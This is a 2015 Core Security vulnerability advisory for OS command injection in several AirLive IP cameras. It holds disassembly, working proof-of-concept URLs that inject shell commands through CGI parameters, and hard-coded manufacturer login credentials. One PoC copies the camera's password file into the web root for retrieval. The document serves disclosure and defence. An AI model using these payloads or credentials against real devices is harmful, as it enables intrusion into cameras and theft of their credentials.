@@ -1,0 +1,225 @@
+1. Advisory Information
+
+Title: AirLive Multiple Products OS Command Injection
+Advisory ID: CORE-2015-0012
+Advisory URL: http://www.coresecurity.com/advisories/airlive-multiple-products-os-command-injection
+Date published: 2015-07-06
+Date of last update: 2015-07-06
+Vendors contacted: AirLive
+Release mode: User release
+
+
+2. Vulnerability Information
+
+Class: OS Command Injection [CWE-78], OS Command Injection [CWE-78]
+Impact: Code execution
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2015-2279, CVE-2014-8389
+
+
+
+3. Vulnerability Description
+
+AirLive MD-3025 [3], BU-3026 [4], BU-2015 [2], WL-2000CAM [5] and POE-200CAM [6] are IP cameras designed for professional surveillance and security applications. The built-in IR LEDs provide high quality nighttime monitoring.
+
+These AirLive [1] devices are vulnerable to an OS Command Injection Vulnerability. In the case of the MD-3025, BU-3026 and BU-2015 cameras, the vulnerability lies in the cgi_test.cgi binary file. In the case of the WL-2000CAM and POE-200CAM cameras, the command injection can be performed using the vulnerable wireless_mft.cgi binary file.
+
+
+4. Vulnerable Packages
+
+AirLive BU-2015 with firmware 1.03.18 16.06.2014
+AirLive BU-3026 with firmware 1.43 21.08.2014
+AirLive MD-3025 with firmware 1.81 21.08.2014
+AirLive WL-2000CAM with firmware LM.1.6.18 14.10.2011
+AirLive POE-200CAM v2 with firmware LM.1.6.17.01
+Other devices may be affected too, but they were not checked.
+
+
+5. Vendor Information, Solutions and Workarounds
+
+Core Security recommends to apply a WAF (Web Application Firewall) rule that would filter the vulnerable request (either the CGI file or the parameters where the injection is performed) in order to avoid exploitation.
+
+Contact the vendor for further information.
+
+
+6. Credits
+
+These vulnerabilities were discovered and researched by Nahuel Riva from Core Security Exploit Writing Team. The publication of this advisory was coordinated by Joaquin Rodriguez Varela from Core Security Advisories Team.
+
+
+7. Technical Description / Proof of Concept Code
+
+7.1. OS Command Injection in cgi_test.cgi when handling certain parameters
+
+[CVE-2015-2279] There is an OS Command Injection in the cgi_test.cgi binary file in the AirLive MD-3025, BU-3026 and BU-2015 cameras when handling certain parameters. That specific CGI file can be requested without authentication, unless the user specified in the configuration of the camera that every communication should be performed over HTTPS (not enabled by default).
+
+The vulnerable parameters are the following:
+
+ 
+write_mac
+write_pid
+write_msn
+write_tan
+write_hdv
+These parameters are used to invoke another binary file called "info_writer".
+
+In the sub_93F4 function it uses the "QUERY_STRING" and checks if it contains any of the parameters followed by an ampersand symbol:
+
+ 
+sub_93F4
+STMFD           SP!, {R4-R7,LR}
+LDR             R0, =aQuery_string ; "QUERY_STRING"
+SUB             SP, SP, #4
+BL              getenv
+MOV             R1, #0  ; c
+MOV             R2, #0x12 ; n
+MOV             R6, R0
+LDR             R0, =unk_14B70 ; s
+BL              memset
+LDR             R0, =aContentTypeTex ; "Content-type: text/html\n\n<body>"
+BL              printf
+MOV             R5, #0
+LDR             R7, =off_B7D0
+MOV             R4, R5
+B               loc_943C
+[...]
+loc_9540                ; jumptable 00009470 case 7
+MOV             R0, R6
+LDR             R1, =aWrite_pid ; "write_pid&"
+BL              strstr
+CMP             R0, #0
+BEQ             loc_94CC ; jumptable 00009470 default case
+[...]
+ 
+It then uses whatever appears after the ampersand symbol in a call to printf() in order to put together the parameter with which the "info_writer" binary will be invoked. Finally, it calls the system() function:
+
+ 
+[...]
+.text:00009730 loc_9730                                ; CODE XREF: .text:00009714j
+.text:00009730                 MOV             R2, R5
+.text:00009734                 LDR             R1, =aOptIpncInfo__1 ; "/opt/ipnc/info_writer -p %s > /dev/null"
+.text:00009738                 MOV             R0, SP
+.text:0000973C                 BL              sprintf
+.text:00009740                 MOV             R0, SP
+.text:00009744                 BL              system
+.text:00009748                 MOV             R2, R5
+.text:0000974C                 LDR             R1, =aWrite_pidOkPid ; "WRITE_PID OK, PID=%s\r\n"
+.text:00009750                 LDR             R0, =unk_1977C
+.text:00009754                 MOV             R4, SP
+.text:00009758                 BL              sprintf
+.text:0000975C                 B               loc_9728
+[...]
+ 
+Consequently, if a semicolon (;) is used after the ampersand symbol, arbitrary commands can be injected into the operating system.
+
+It's important to take into account that depending on the parameter used, there are checks like this (corresponding to the write_pid parameter):
+
+ 
+.text:00009708                 MOV             R0, R5
+.text:0000970C                 BL              strlen
+.text:00009710                 CMP             R0, #9
+ 
+This verifies that the parameter has a specific length. Because of this, the injection is somewhat limited. Nevertheless, there are possible commands that can be executed, for example:
+
+ 
+Proof of Concept:
+
+http://<Camera-IP>:8080/cgi_test.cgi?write_tan&;ls&ls%20-la
+
+
+PoC Output:
+
+Write MAC address, model name, hw version, sn, tan, pid,firmware version
+ 
+  -c => set system MAC address
+  -m [MAC] => write MAC address
+  -n [Model Name] => write Model Name
+  -h [HW Version] => write HW Version
+  -v [Firmware Version] => write Firmware Version
+  -s [SN] => write SN
+  -t [TAN] => write TAN
+  -d [PID] => write PID
+  -r [CR] => write Country Region
+  -p => show current info.
+ 
+Content-type: text/html
+ 
+<body>WRITE_TAN OK, PID=;ls&ls%20-
+</body></html>3g.htm
+485.htm
+SStreamVideo.cab
+ado.htm
+cfgupgrade.cgi
+cgi_test.cgi
+client.htm
+default.htm
+default_else.htm
+default_ie.htm
+default_m.htm
+default_nets.htm
+[...]
+ 
+7.2. OS Command Injection in AirLive WL-2000CAM's wireless_mft.cgi binary file
+
+[CVE-2014-8389] The AirLive WL-2000CAM anf POE-200CAM "/cgi-bin/mft/wireless_mft.cgi" binary file, has an OS command injection in the parameter ap that can be exploited using the hard-coded credentials the embedded Boa web server has inside its configuration file:
+
+ 
+username: manufacture
+password: erutcafunam
+ 
+The following proof of concept copies the file where the user credentials are stored in the web server root directory:
+
+ 
+  <a href="http://<Camera-IP>/cgi-bin/mft/wireless_mft?ap=testname;cp%20/var/www/secret.passwd%20/web/html/credentials">http://<Camera-IP>/cgi-bin/mft/wireless_mft?ap=testname;cp%20/var/www/...</a>
+   
+Afterwards, the user credentials can be obtained by requesting:
+
+ 
+<a href="http://<Camera-IP>/credentials">http://<Camera-IP>/credentials</a>
+ 
+The credentials are encoded in a string using Base64, therefore it is easy to decode them and have complete access to the device.
+
+
+
+8. Report Timeline
+
+2015-05-04: Core Security sent an initial email notification to AirLive. Publication date set to Jun 8, 2015.
+2015-05-07: Core Security sent another email notification to AirLive.
+2015-05-14: Core Security attempted to contact AirLive through Twitter.
+2015-05-20: Core Security attempted to contact AirLive through Twitter again.
+2015-06-16: Core Security sent another email and Twitter notification to AirLive.
+2015-06-18: Core Security sent an email to Airlive explaining that this was their last opportunity to reply, if not the advisory was going to be published on June 23, 2015.
+2015-07-06: Advisory CORE-2015-0012 published.
+
+
+9. References
+
+[1] http://www.airlive.com. 
+[2] http://www.airlive.com/product/BU-2015. 
+[3] http://www.airlive.com/product/MD-3025. 
+[4] http://www.airlive.com/product/BU-3026. 
+[5] http://www.airlivecam.eu/manualy/ip_kamery/WL-2000CAM.pdf. 
+[6] http://www.airlivesecurity.com/product.php?id=5#. 
+
+
+10. About CoreLabs
+
+CoreLabs, the research center of Core Security, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://corelabs.coresecurity.com.
+
+
+11. About Core Security Technologies
+
+Core Security Technologies enables organizations to get ahead of threats with security test and measurement solutions that continuously identify and demonstrate real-world exposures to their most critical assets. Our customers can gain real visibility into their security standing, real validation of their security controls, and real metrics to more effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted research and leading-edge threat expertise from the company's Security Consulting Services, CoreLabs and Engineering groups. Core Security Technologies can be reached at +1 (617) 399-6980 or on the Web at: http://www.coresecurity.com.
+
+
+12. Disclaimer
+
+The contents of this advisory are copyright (c) 2015 Core Security and (c) 2015 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+
+13. PGP/GPG Keys
+
+This advisory has been signed with the GPG key of Core Security advisories team, which is available for download at http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
